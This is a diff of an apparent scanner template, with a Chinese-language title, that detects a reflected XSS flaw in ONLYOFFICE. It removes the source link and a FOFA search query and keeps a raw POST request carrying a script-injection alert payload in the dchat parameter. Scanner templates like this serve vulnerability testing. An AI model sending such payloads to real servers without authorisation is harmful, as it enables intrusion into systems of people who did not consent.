@@ -3,12 +3,8 @@ info:
   name: onlyoffice-dchat存在反射xss漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rnr7hwsuauq77s87'
+  description: ''
   tags: xss,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rnr7hwsuauq77s87
-    fofa: app="ONLYOFFICE"
 http:
 - raw:
   - 'POST /hosting/wopi/word/edit?dchat=asdasd</script><script>alert(''XSS'')</script> HTTP/1.1
